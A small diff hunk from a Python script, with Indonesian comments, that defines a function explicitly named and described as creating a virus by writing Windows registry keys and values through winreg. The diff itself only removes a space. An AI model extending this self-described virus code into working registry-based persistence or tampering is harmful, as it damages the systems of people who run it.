@@ -7,7 +7,7 @@
 import winreg as reg
 
 # membuat fungsi atau function untuk membuat virus yang diberi nama buat_virus
-def create_virus(root_key, key_path, key_name, value_type ,value ):
+def create_virus(root_key, key_path, key_name, value_type ,value):
     key = reg.CreateKey(root_key, key_path)
     reg.SetValueEx(key, key_name, 0, value_type, value)
     reg.CloseKey(key)
